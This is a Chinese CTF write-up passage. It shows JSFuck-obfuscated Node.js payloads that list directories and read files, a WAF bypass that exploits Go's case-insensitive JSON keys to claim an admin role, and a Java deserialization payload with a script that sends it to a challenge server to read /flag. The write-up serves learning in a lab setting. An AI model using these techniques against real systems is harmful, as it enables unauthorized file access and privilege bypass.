JSFuck正好就是只含有`!+()[]`6种字符。我们使用[jsfuck.com](https://jsfuck.com)把我们的攻击代码转为JSFuck即可。

下面只给出原始代码，请自行在JSFuck网站转换（勾选Eval Source和Run In Parent Scope）。

读取目录：
```js
global.process.mainModule.require("fs").readdirSync("/")
```
读取文件
```js
global.process.mainModule.require("fs").readFileSync(...)
```

将payload以 `{"expr": "${payload}"}` 格式POST至 `/calc` 即可。

### Go!
先随便打一个Payload（POST，`aa=a`）过去，返回Invalid JSON错误，说明接口需要body提供JSON数据。

提供`{"role":"admin"}会被WAF拦下。

利用Go语言JSON反序列化不区分键名大小写的漏洞（准确地说是“过滤程序与解析器的大小写敏感性存在差异的漏洞”），把"role"写成"Role"即可。

### 你也懂Java？
不明白为什么标的中等题，这完全比我哈威那两位学长出的题简单，那几个题看着不复杂但是绕过技巧一点不知道，我一个也没出。。。

给我们发了一个JAR包，改为 `.zip` 解压，可以看到甚至还有 `.java` 源文件，都不用我们自行反编译。

打开靶机又会发现一段代码。我懒得开靶机了，就不写了。

普普通通的反序列化漏洞而已。

生成Payload：
```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class genPayload {
    public static void main(String[] args) throws Exception {
        Note note = new Note("Title", "Message", "/flag");
        FileOutputStream fos = new FileOutputStream("./payload");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(note);
        oos.close();
        fos.close();
    }
}
```

发过去就行。
```py
with open("payload", "rb") as f:
    payload = f.read()

import requests

URL = "http://challenge.shc.tf:31924/upload"

res = requests.post(URL, data=payload)

print(res.text)
```
